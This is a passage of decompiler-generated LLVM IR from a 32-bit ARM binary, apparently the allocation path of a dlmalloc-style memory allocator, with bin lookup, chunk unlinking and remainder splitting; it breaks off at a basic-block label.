  %v9_11604 = load i32, i32* @r6, align 4
  %v12_11604 = load i32, i32* @r7, align 4
  %v15_11604 = load i32, i32* @r8, align 4
  %v18_11604 = load i32, i32* @sb, align 4
  %v21_11604 = load i32, i32* @sl, align 4
  %v24_11604 = load i32, i32* @fp, align 4
  %v27_11604 = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_11618 = load i32, i32* inttoptr (i32 124156 to i32*), align 4
  store i32 %v4_11618, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_11624 = load i32, i32* inttoptr (i32 124124 to i32*), align 4
  store i32 %v4_11624, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_11618, i32* %r2.global-to-local, align 4
  %v2_11630 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11630, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v4_1163c = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  store i32 %v4_1163c, i32* %ip.global-to-local, align 4
  store i32 71240, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1163c)
  %v0_11648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11648, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_11654 = load i32, i32* inttoptr (i32 124104 to i32*), align 8
  store i32 %v4_11654, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11660.328 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11654)
  %v0_11660 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11660, -32
  br i1 %tmp, label %dec_label_pc_1167c, label %dec_label_pc_11668

dec_label_pc_11668:                               ; preds = %dec_label_pc_11604
  %v0_11668 = call i32 @function_11008()
  store i32 %v0_11668, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_11674 = inttoptr i32 %v0_11668 to i32*
  store i32 12, i32* %v2_11674, align 4
  br label %dec_label_pc_11ef8

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11604
  %v1_1167c = add i32 %v0_11660, 11
  store i32 %v1_1167c, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v2_11688 = icmp ugt i32 %v1_1167c, 14
  %v7_11688 = icmp eq i32 %v1_1167c, 15
  %v2_1168c = xor i1 %v7_11688, true
  %v3_1168c = and i1 %v2_11688, %v2_1168c
  br i1 %v3_1168c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_1167c
  %v5_1168c = and i32 %v1_1167c, -8
  store i32 %v5_1168c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_1167c, %bb
  %v4_11690 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11690, i32* @r0, align 4
  %v1_11694 = inttoptr i32 %v4_11690 to i32*
  %v2_11694 = load i32, i32* %v1_11694, align 4
  store i32 %v2_11694, i32* @r4, align 4
  %v2_11698 = xor i1 %v2_11688, true
  %v3_11698 = or i1 %v7_11688, %v2_11698
  br i1 %v3_11698, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_1169c = urem i32 %v2_11694, 2
  %v2_1169c = icmp eq i32 %v1_1169c, 0
  br i1 %v2_1169c, label %dec_label_pc_116a4, label %dec_label_pc_116b4

dec_label_pc_116a4:                               ; preds = %bb140
  %v2_116a4 = icmp eq i32 %v2_11694, 0
  br i1 %v2_116a4, label %dec_label_pc_116ac, label %dec_label_pc_11a90

dec_label_pc_116ac:                               ; preds = %dec_label_pc_116a4
  %v0_116ac = call i32 @function_124bc()
  store i32 %v0_116ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a90

dec_label_pc_116b4:                               ; preds = %bb140
  %v0_116b4 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_116b4, %v2_11694
  br i1 %tmp201, label %dec_label_pc_116dc, label %dec_label_pc_116bc

dec_label_pc_116bc:                               ; preds = %dec_label_pc_116b4
  %v1_116bc = add i32 %v4_11690, -4
  store i32 %v1_116bc, i32* %r1.global-to-local, align 4
  %v3_116c0 = udiv i32 %v0_116b4, 8
  store i32 %v3_116c0, i32* %r2.global-to-local, align 4
  %v4_116c4 = mul nuw i32 %v3_116c0, 4
  %v5_116c4 = add i32 %v4_116c4, %v1_116bc
  %v6_116c4 = inttoptr i32 %v5_116c4 to i32*
  %v7_116c4 = load i32, i32* %v6_116c4, align 4
  store i32 %v7_116c4, i32* %r0.global-to-local, align 4
  %v2_116c8 = icmp eq i32 %v7_116c4, 0
  br i1 %v2_116c8, label %dec_label_pc_116dc, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_116bc
  %v2_116cc = add i32 %v7_116c4, 8
  %v3_116cc = inttoptr i32 %v2_116cc to i32*
  %v4_116cc = load i32, i32* %v3_116cc, align 4
  store i32 %v4_116cc, i32* %r3.global-to-local, align 4
  store i32 %v2_116cc, i32* %r0.global-to-local, align 4
  store i32 %v2_116cc, i32* %r4.global-to-local, align 4
  store i32 %v4_116cc, i32* %v6_116c4, align 4
  br label %dec_label_pc_11edc

dec_label_pc_116dc:                               ; preds = %dec_label_pc_116bc, %dec_label_pc_116b4
  %tmp202 = icmp ugt i32 %v0_116b4, 255
  br i1 %tmp202, label %dec_label_pc_1172c, label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116dc
  store i32 124088, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_116ec = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  %v3_116f0 = udiv i32 %v0_116b4, 8
  store i32 %v3_116f0, i32* @r7, align 4
  %v4_116f4 = mul nuw i32 %v3_116f0, 8
  %v5_116f4 = add i32 %v4_116ec, %v4_116f4
  store i32 %v5_116f4, i32* %r3.global-to-local, align 4
  %v1_116f8 = add i32 %v5_116f4, 44
  store i32 %v1_116f8, i32* %ip.global-to-local, align 4
  %v1_116fc = add i32 %v5_116f4, 56
  %v2_116fc = inttoptr i32 %v1_116fc to i32*
  %v3_116fc = load i32, i32* %v2_116fc, align 4
  store i32 %v3_116fc, i32* %r0.global-to-local, align 4
  %v9_11700 = icmp eq i32 %v3_116fc, %v1_116f8
  br i1 %v9_11700, label %dec_label_pc_1188c, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116e4
  %v2_11708 = add i32 %v3_116fc, %v0_116b4
  store i32 %v2_11708, i32* %r3.global-to-local, align 4
  %v1_1170c = add i32 %v2_11708, 4
  %v2_1170c = inttoptr i32 %v1_1170c to i32*
  %v3_1170c = load i32, i32* %v2_1170c, align 4
  store i32 %v3_1170c, i32* %r2.global-to-local, align 4
  %v1_11710 = add i32 %v3_116fc, 12
  %v2_11710 = inttoptr i32 %v1_11710 to i32*
  %v3_11710 = load i32, i32* %v2_11710, align 4
  store i32 %v3_11710, i32* %r1.global-to-local, align 4
  %v1_11714 = or i32 %v3_1170c, 1
  store i32 %v1_11714, i32* %r2.global-to-local, align 4
  %v1_11718 = add i32 %v3_116fc, 8
  store i32 %v1_11718, i32* %r4.global-to-local, align 4
  store i32 %v1_11714, i32* %v2_1170c, align 4
  %v0_11720 = load i32, i32* %ip.global-to-local, align 4
  %v1_11720 = load i32, i32* %r1.global-to-local, align 4
  %v2_11720 = add i32 %v1_11720, 8
  %v3_11720 = inttoptr i32 %v2_11720 to i32*
  store i32 %v0_11720, i32* %v3_11720, align 4
  %v0_11724 = load i32, i32* %r1.global-to-local, align 4
  %v1_11724 = load i32, i32* %ip.global-to-local, align 4
  %v2_11724 = add i32 %v1_11724, 12
  %v3_11724 = inttoptr i32 %v2_11724 to i32*
  store i32 %v0_11724, i32* %v3_11724, align 4
  br label %dec_label_pc_11edc

dec_label_pc_1172c:                               ; preds = %dec_label_pc_116dc
  store i32 %v0_116b4, i32* %r0.global-to-local, align 4
  %v1_11730 = call i32 @function_1158c(i32 %v0_116b4)
  store i32 %v1_11730, i32* %r0.global-to-local, align 4
  %v0_11734 = load i32, i32* @r4, align 4
  %v1_11734 = and i32 %v0_11734, 2
  %v2_11734 = icmp eq i32 %v1_11734, 0
  store i32 %v1_11730, i32* @r7, align 4
  br i1 %v2_11734, label %dec_label_pc_1188c, label %dec_label_pc_11740

dec_label_pc_11740:                               ; preds = %dec_label_pc_1172c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_11748 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11748, i32* @r0, align 4
  %v0_1174c = call i32 @function_124bc()
  store i32 %v0_1174c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1188c

dec_label_pc_11754:                               ; preds = %dec_label_pc_118a0
  %v1_11754 = add i32 %v3_118a0, 4
  %v2_11754 = inttoptr i32 %v1_11754 to i32*
  %v3_11754 = load i32, i32* %v2_11754, align 4
  store i32 %v3_11754, i32* %r3.global-to-local, align 4
  %v0_11758 = load i32, i32* @sl, align 4
  %v1_1175c = and i32 %v3_11754, -4
  store i32 %v1_1175c, i32* %r4.global-to-local, align 4
  %v1_11760 = add i32 %v3_118a0, 12
  %v2_11760 = inttoptr i32 %v1_11760 to i32*
  %v3_11760 = load i32, i32* %v2_11760, align 4
  store i32 %v3_11760, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_11758, 255
  br i1 %tmp203, label %dec_label_pc_117bc, label %dec_label_pc_11768

dec_label_pc_11768:                               ; preds = %dec_label_pc_11754
  %v9_11768 = icmp eq i32 %v3_11760, %v0_117c0
  br i1 %v9_11768, label %dec_label_pc_11770, label %dec_label_pc_117bc

dec_label_pc_11770:                               ; preds = %dec_label_pc_11768
  %v0_11770 = load i32, i32* @sb, align 4
  %v1_11770 = add i32 %v0_11770, 48
  %v2_11770 = inttoptr i32 %v1_11770 to i32*
  %v3_11770 = load i32, i32* %v2_11770, align 4
  store i32 %v3_11770, i32* %r3.global-to-local, align 4
  %v9_11774 = icmp eq i32 %v3_118a0, %v3_11770
  br i1 %v9_11774, label %dec_label_pc_1177c, label %dec_label_pc_117bc

dec_label_pc_1177c:                               ; preds = %dec_label_pc_11770
  %v1_1177c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_1175c, %v1_1177c
  br i1 %tmp204, label %dec_label_pc_11784, label %dec_label_pc_117bc

dec_label_pc_11784:                               ; preds = %dec_label_pc_1177c
  %v2_11784 = sub i32 %v1_1175c, %v0_11758
  store i32 %v2_11784, i32* %r2.global-to-local, align 4
  %v2_11788 = add i32 %v0_11758, %v3_118a0
  store i32 %v2_11788, i32* %r3.global-to-local, align 4
  %v1_1178c = or i32 %v0_11758, 1
  store i32 %v1_1178c, i32* %r0.global-to-local, align 4
  %v1_11790 = or i32 %v2_11784, 1
  store i32 %v1_11790, i32* %r1.global-to-local, align 4
  %v1_11794 = add i32 %v3_118a0, 8
  store i32 %v1_11794, i32* %r4.global-to-local, align 4
  %v2_11798 = add i32 %v0_117c0, 8
  %v3_11798 = inttoptr i32 %v2_11798 to i32*
  store i32 %v2_11788, i32* %v3_11798, align 4
  %v0_1179c = load i32, i32* %r3.global-to-local, align 4
  %v1_1179c = load i32, i32* %ip.global-to-local, align 4
  %v2_1179c = add i32 %v1_1179c, 12
  %v3_1179c = inttoptr i32 %v2_1179c to i32*
  store i32 %v0_1179c, i32* %v3_1179c, align 4
  %v0_117a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_117a0 = load i32, i32* @r6, align 4
  %v2_117a0 = add i32 %v1_117a0, 4
  %v3_117a0 = inttoptr i32 %v2_117a0 to i32*
  store i32 %v0_117a0, i32* %v3_117a0, align 4
  %v0_117a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_117a4 = load i32, i32* @sb, align 4
  %v2_117a4 = add i32 %v1_117a4, 48
  %v3_117a4 = inttoptr i32 %v2_117a4 to i32*
  store i32 %v0_117a4, i32* %v3_117a4, align 4
  %v0_117a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_117a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_117a8 = add i32 %v1_117a8, %v0_117a8
  %v4_117a8 = inttoptr i32 %v3_117a8 to i32*
  store i32 %v0_117a8, i32* %v4_117a8, align 4
  %v0_117ac = load i32, i32* %r1.global-to-local, align 4
  %v1_117ac = load i32, i32* %r3.global-to-local, align 4
  %v2_117ac = add i32 %v1_117ac, 4
  %v3_117ac = inttoptr i32 %v2_117ac to i32*
  store i32 %v0_117ac, i32* %v3_117ac, align 4
  %v0_117b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_117b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_117b0 = add i32 %v1_117b0, 12
  %v3_117b0 = inttoptr i32 %v2_117b0 to i32*
  store i32 %v0_117b0, i32* %v3_117b0, align 4
  %v0_117b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_117b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_117b4 = add i32 %v1_117b4, 8
  %v3_117b4 = inttoptr i32 %v2_117b4 to i32*
  store i32 %v0_117b4, i32* %v3_117b4, align 4
  br label %dec_label_pc_11edc

dec_label_pc_117bc:                               ; preds = %dec_label_pc_1177c, %dec_label_pc_11770, %dec_label_pc_11768, %dec_label_pc_11754
  %v9_117bc = icmp eq i32 %v1_1175c, %v0_11758
  %v2_117c0 = add i32 %v3_11760, 8
  %v3_117c0 = inttoptr i32 %v2_117c0 to i32*
  store i32 %v0_117c0, i32* %v3_117c0, align 4
  %v0_117c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_117c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_117c4 = add i32 %v1_117c4, 12
  %v3_117c4 = inttoptr i32 %v2_117c4 to i32*
  store i32 %v0_117c4, i32* %v3_117c4, align 4
  br i1 %v9_117bc, label %dec_label_pc_1191c.loopexit, label %dec_label_pc_117d8

dec_label_pc_117d8:                               ; preds = %dec_label_pc_117bc
  %v0_117d8 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_117d8, 255
  br i1 %tmp205, label %dec_label_pc_117fc, label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117d8
  store i32 124088, i32* %r2.global-to-local, align 4
  %v1_117e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_117e4 = add i32 %v1_117e4, 124088
  %v3_117e4 = inttoptr i32 %v2_117e4 to i32*
  %v4_117e4 = load i32, i32* %v3_117e4, align 4
  %v3_117e8 = udiv i32 %v0_117d8, 8
  store i32 %v3_117e8, i32* %r0.global-to-local, align 4
  %v4_117ec = mul nuw i32 %v3_117e8, 8
  %v5_117ec = add i32 %v4_117e4, %v4_117ec
  store i32 %v5_117ec, i32* %r3.global-to-local, align 4
  %v1_117f0 = add i32 %v5_117ec, 44
  store i32 %v1_117f0, i32* %ip.global-to-local, align 4
  %v1_117f4 = add i32 %v5_117ec, 52
  %v2_117f4 = inttoptr i32 %v1_117f4 to i32*
  %v3_117f4 = load i32, i32* %v2_117f4, align 4
  store i32 %v3_117f4, i32* @lr, align 4
  br label %dec_label_pc_11854

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117d8
  store i32 %v0_117d8, i32* %r0.global-to-local, align 4
  %v1_11800 = call i32 @function_1158c(i32 %v0_117d8)
  store i32 %v1_11800, i32* %r0.global-to-local, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v1_11808 = load i32, i32* %r8.global-to-local, align 4
  %v2_11808 = add i32 %v1_11808, 124088
  %v3_11808 = inttoptr i32 %v2_11808 to i32*
  %v4_11808 = load i32, i32* %v3_11808, align 4
  %v4_1180c = mul i32 %v1_11800, 8
  %v5_1180c = add i32 %v4_11808, %v4_1180c
  store i32 %v5_1180c, i32* %r3.global-to-local, align 4
  %v1_11810 = add i32 %v5_1180c, 44
  store i32 %v1_11810, i32* %ip.global-to-local, align 4
  %v1_11814 = add i32 %v5_1180c, 52
  %v2_11814 = inttoptr i32 %v1_11814 to i32*
  %v3_11814 = load i32, i32* %v2_11814, align 4
  store i32 %v3_11814, i32* @lr, align 4
  %v9_11818 = icmp eq i32 %v3_11814, %v1_11810
  br i1 %v9_11818, label %dec_label_pc_11854, label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_117fc
  %v1_11820 = add i32 %v5_1180c, 56
  %v2_11820 = inttoptr i32 %v1_11820 to i32*
  %v3_11820 = load i32, i32* %v2_11820, align 4
  store i32 %v3_11820, i32* %r1.global-to-local, align 4
  %v1_11824 = add i32 %v3_11820, 4
  %v2_11824 = inttoptr i32 %v1_11824 to i32*
  %v3_11824 = load i32, i32* %v2_11824, align 4
  store i32 %v3_11824, i32* %r3.global-to-local, align 4
  %v0_11828 = load i32, i32* %r4.global-to-local, align 4
  %v3_11828 = icmp ult i32 %v0_11828, %v3_11824
  br i1 %v3_11828, label %.thread, label %dec_label_pc_11844.preheader

.thread:                                          ; preds = %dec_label_pc_11820
  store i32 %v1_11810, i32* @lr, align 4
  store i32 %v3_11820, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11854

dec_label_pc_11844.preheader:                     ; preds = %dec_label_pc_11820
  %v2_11830 = or i32 %v0_11828, 1
  store i32 %v2_11830, i32* %r2.global-to-local, align 4
  %v1_11844179 = add i32 %v3_11814, 4
  %v2_11844180 = inttoptr i32 %v1_11844179 to i32*
  %v3_11844181 = load i32, i32* %v2_11844180, align 4
  store i32 %v3_11844181, i32* %r3.global-to-local, align 4
  %v3_11848183 = icmp ult i32 %v2_11830, %v3_11844181
  br i1 %v3_11848183, label %dec_label_pc_11840, label %dec_label_pc_11850

dec_label_pc_11840:                               ; preds = %dec_label_pc_11844.preheader, %dec_label_pc_11840
  %v0_11850184 = phi i32 [ %v3_11840, %dec_label_pc_11840 ], [ %v3_11814, %dec_label_pc_11844.preheader ]
  %v1_11840 = add i32 %v0_11850184, 8
  %v2_11840 = inttoptr i32 %v1_11840 to i32*
  %v3_11840 = load i32, i32* %v2_11840, align 4
  store i32 %v3_11840, i32* @lr, align 4
  %v1_11844 = add i32 %v3_11840, 4
  %v2_11844 = inttoptr i32 %v1_11844 to i32*
  %v3_11844 = load i32, i32* %v2_11844, align 4
  store i32 %v3_11844, i32* %r3.global-to-local, align 4
  %v3_11848 = icmp ult i32 %v2_11830, %v3_11844
  br i1 %v3_11848, label %dec_label_pc_11840, label %dec_label_pc_11850

dec_label_pc_11850:                               ; preds = %dec_label_pc_11840, %dec_label_pc_11844.preheader
  %v0_11850.lcssa = phi i32 [ %v3_11814, %dec_label_pc_11844.preheader ], [ %v3_11840, %dec_label_pc_11840 ]
  %v1_11850 = add i32 %v0_11850.lcssa, 12
  %v2_11850 = inttoptr i32 %v1_11850 to i32*
  %v3_11850 = load i32, i32* %v2_11850, align 4
  store i32 %v3_11850, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11854

dec_label_pc_11854:                               ; preds = %.thread, %dec_label_pc_117fc, %dec_label_pc_117e0, %dec_label_pc_11850
  %v0_11874 = phi i32 [ %v1_11810, %dec_label_pc_117fc ], [ %v1_117f0, %dec_label_pc_117e0 ], [ %v3_11850, %dec_label_pc_11850 ], [ %v3_11820, %.thread ]
  %v0_11868 = phi i32 [ %v1_11800, %dec_label_pc_117fc ], [ %v3_117e8, %dec_label_pc_117e0 ], [ %v1_11800, %dec_label_pc_11850 ], [ %v1_11800, %.thread ]
  %v1_11858 = phi i32 [ %v1_11808, %dec_label_pc_117fc ], [ %v1_117e4, %dec_label_pc_117e0 ], [ %v1_11808, %dec_label_pc_11850 ], [ %v1_11808, %.thread ]
  store i32 124088, i32* %r2.global-to-local, align 4
  %v2_11858 = add i32 %v1_11858, 124088
  %v3_11858 = inttoptr i32 %v2_11858 to i32*
  %v4_11858 = load i32, i32* %v3_11858, align 4
  %v3_1185c = sdiv i32 %v0_11868, 32
  store i32 %v3_1185c, i32* %r3.global-to-local, align 4
  %v4_11860 = mul nsw i32 %v3_1185c, 4
  %v5_11860 = add i32 %v4_11858, %v4_11860
  store i32 %v5_11860, i32* %r1.global-to-local, align 4
  %v1_11864 = add i32 %v5_11860, 820
  %v2_11864 = inttoptr i32 %v1_11864 to i32*
  %v3_11864 = load i32, i32* %v2_11864, align 4
  %v1_11868 = urem i32 %v0_11868, 32
  store i32 %v1_11868, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11870 = shl i32 1, %v1_11868
  %v8_11870 = or i32 %v3_11864, %v7_11870
  store i32 %v8_11870, i32* %r3.global-to-local, align 4
  %v1_11874 = load i32, i32* @r6, align 4
  %v2_11874 = add i32 %v1_11874, 12
  %v3_11874 = inttoptr i32 %v2_11874 to i32*
  store i32 %v0_11874, i32* %v3_11874, align 4
  %v0_11878 = load i32, i32* @lr, align 4
  %v1_11878 = load i32, i32* @r6, align 4
  %v2_11878 = add i32 %v1_11878, 8
  %v3_11878 = inttoptr i32 %v2_11878 to i32*
  store i32 %v0_11878, i32* %v3_11878, align 4
  %v0_1187c = load i32, i32* %r3.global-to-local, align 4
  %v1_1187c = load i32, i32* %r1.global-to-local, align 4
  %v2_1187c = add i32 %v1_1187c, 820
  %v3_1187c = inttoptr i32 %v2_1187c to i32*
  store i32 %v0_1187c, i32* %v3_1187c, align 4
  %v0_11880 = load i32, i32* @r6, align 4
  %v1_11880 = load i32, i32* @lr, align 4
  %v2_11880 = add i32 %v1_11880, 12
  %v3_11880 = inttoptr i32 %v2_11880 to i32*
  store i32 %v0_11880, i32* %v3_11880, align 4
  %v0_11884 = load i32, i32* @r6, align 4
  %v1_11884 = load i32, i32* %ip.global-to-local, align 4
  %v2_11884 = add i32 %v1_11884, 8
  %v3_11884 = inttoptr i32 %v2_11884 to i32*
  store i32 %v0_11884, i32* %v3_11884, align 4
  %v0_118a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_118a0

dec_label_pc_1188c:                               ; preds = %dec_label_pc_116e4, %dec_label_pc_1172c, %dec_label_pc_11740
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_11894 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11894, i32* @sb, align 4
  %v0_11898 = load i32, i32* @sl, align 4
  %v1_11898 = add i32 %v0_11898, 16
  store i32 %v1_11898, i32* @fp, align 4
  %v1_1189c = add i32 %v4_11894, 52
  store i32 %v1_1189c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11854, %dec_label_pc_1188c
  %v0_117c0 = phi i32 [ %v0_118a0.pre, %dec_label_pc_11854 ], [ %v1_1189c, %dec_label_pc_1188c ]
  %v1_118a0 = add i32 %v0_117c0, 12
  %v2_118a0 = inttoptr i32 %v1_118a0 to i32*
  %v3_118a0 = load i32, i32* %v2_118a0, align 4
  store i32 %v3_118a0, i32* @r6, align 4
  %v9_118a4 = icmp eq i32 %v3_118a0, %v0_117c0
  br i1 %v9_118a4, label %dec_label_pc_118ac, label %dec_label_pc_11754

dec_label_pc_118ac:                               ; preds = %dec_label_pc_118a0
  %v0_118ac = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_118ac, 256
  %v0_11964.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_118ac.dec_label_pc_11964_crit_edge, label %dec_label_pc_118b4

dec_label_pc_118ac.dec_label_pc_11964_crit_edge:  ; preds = %dec_label_pc_118ac
  %.pre200 = mul i32 %v0_11964.pre, 8
  br label %dec_label_pc_11964

dec_label_pc_118b4:                               ; preds = %dec_label_pc_118ac
  %v4_118b4 = mul i32 %v0_11964.pre, 8
  %v5_118b4 = add i32 %v4_118b4, %v0_117c0
  store i32 %v5_118b4, i32* %r3.global-to-local, align 4
  %v1_118b8 = add i32 %v5_118b4, -8
  store i32 %v1_118b8, i32* %r1.global-to-local, align 4
  %v1_118bc = add i32 %v5_118b4, 4
  %v2_118bc = inttoptr i32 %v1_118bc to i32*
  %storemerge.pre = load i32, i32* %v2_118bc, align 4
  br label %dec_label_pc_1195c

dec_label_pc_118c4:                               ; preds = %dec_label_pc_1195c
  %v1_118c4 = add i32 %v1_118ec, 4
  %v2_118c4 = inttoptr i32 %v1_118c4 to i32*
  %v3_118c4 = load i32, i32* %v2_118c4, align 4
  store i32 %v3_118c4, i32* %r3.global-to-local, align 4
  %v1_118c8 = and i32 %v3_118c4, -4
  store i32 %v1_118c8, i32* %r2.global-to-local, align 4
  %v3_118cc = icmp ult i32 %v1_118c8, %v0_118ac
  %v1_118d0 = add i32 %v1_118ec, 12
  %v2_118d0 = inttoptr i32 %v1_118d0 to i32*
  %v3_118d0 = load i32, i32* %v2_118d0, align 4
  store i32 %v3_118d0, i32* %r0.global-to-local, align 4
  br i1 %v3_118cc, label %dec_label_pc_1195c, label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118c4
  %v1_118d8 = add i32 %v1_118ec, 8
  %v2_118d8 = inttoptr i32 %v1_118d8 to i32*
  %v3_118d8 = load i32, i32* %v2_118d8, align 4
  store i32 %v3_118d8, i32* %r1.global-to-local, align 4
  %v1_118dc = add i32 %v3_118d8, 12
  %v2_118dc = inttoptr i32 %v1_118dc to i32*
  %v3_118dc = load i32, i32* %v2_118dc, align 4
  store i32 %v3_118dc, i32* %r3.global-to-local, align 4
  %v9_118e0 = icmp eq i32 %v3_118dc, %v1_118ec
  br i1 %v9_118e0, label %dec_label_pc_118e8, label %dec_label_pc_118f4

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118d8
  %v1_118e8 = add i32 %v3_118d0, 8
  %v2_118e8 = inttoptr i32 %v1_118e8 to i32*
  %v3_118e8 = load i32, i32* %v2_118e8, align 4
  store i32 %v3_118e8, i32* %r3.global-to-local, align 4
  %v9_118ec = icmp eq i32 %v3_118e8, %v1_118ec
  br i1 %v9_118ec, label %dec_label_pc_118f8, label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118d8, %dec_label_pc_118e8
  %v0_118f4 = call i32 @function_128ec()
  store i32 %v0_118f4, i32* %r0.global-to-local, align 4
  %v0_118f8.pre = load i32, i32* @sl, align 4
  %v1_118f8.pre = load i32, i32* @r2, align 4
  %v0_11900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118e8, %dec_label_pc_118f4
  %v1_11900 = phi i32 [ %v3_118d0, %dec_label_pc_118e8 ], [ %v0_118f4, %dec_label_pc_118f4 ]
  %v0_11900 = phi i32 [ %v3_118d8, %dec_label_pc_118e8 ], [ %v0_11900.pre, %dec_label_pc_118f4 ]
  %v1_118f8 = phi i32 [ %v1_118c8, %dec_label_pc_118e8 ], [ %v1_118f8.pre, %dec_label_pc_118f4 ]
  %v0_118f8 = phi i32 [ %v0_118ac, %dec_label_pc_118e8 ], [ %v0_118f8.pre, %dec_label_pc_118f4 ]
  %v2_118f8 = sub i32 %v1_118f8, %v0_118f8
  store i32 %v2_118f8, i32* %lr.global-to-local, align 4
  %v2_11900 = add i32 %v1_11900, 8
  %v3_11900 = inttoptr i32 %v2_11900 to i32*
  store i32 %v0_11900, i32* %v3_11900, align 4
  %v0_11904 = load i32, i32* %r0.global-to-local, align 4
  %v1_11904 = load i32, i32* %r1.global-to-local, align 4
  %v2_11904 = add i32 %v1_11904, 12
  %v3_11904 = inttoptr i32 %v2_11904 to i32*
  store i32 %v0_11904, i32* %v3_11904, align 4
  %v0_11908 = load i32, i32* %ip.global-to-local, align 4
  %v1_11908 = add i32 %v0_11908, 8
  store i32 %v1_11908, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_118f8, 15
  br i1 %tmp207, label %dec_label_pc_11928, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_118f8
  %v1_11910 = load i32, i32* %r2.global-to-local, align 4
  %v2_11910 = add i32 %v1_11910, %v0_11908
  store i32 %v2_11910, i32* %r2.global-to-local, align 4
  %v1_11914 = add i32 %v2_11910, 4
  %v2_11914 = inttoptr i32 %v1_11914 to i32*
  %v3_11914 = load i32, i32* %v2_11914, align 4
  store i32 %v3_11914, i32* %r3.global-to-local, align 4
  store i32 %v1_11908, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_1191c.loopexit:                      ; preds = %dec_label_pc_117bc
  %v1_117c8 = load i32, i32* @r6, align 4
  %v2_117c8 = load i32, i32* @sl, align 4
  %v3_117c8 = add i32 %v2_117c8, %v1_117c8
  store i32 %v3_117c8, i32* %r2.global-to-local, align 4
  %v2_117cc = add i32 %v3_117c8, 4
  %v3_117cc = inttoptr i32 %v2_117cc to i32*
  %v4_117cc = load i32, i32* %v3_117cc, align 4
  store i32 %v4_117cc, i32* %r3.global-to-local, align 4
  %v2_117d0 = add i32 %v1_117c8, 8
  store i32 %v2_117d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %.dec_label_pc_1191c_crit_edge, %dec_label_pc_1191c.loopexit, %dec_label_pc_11910
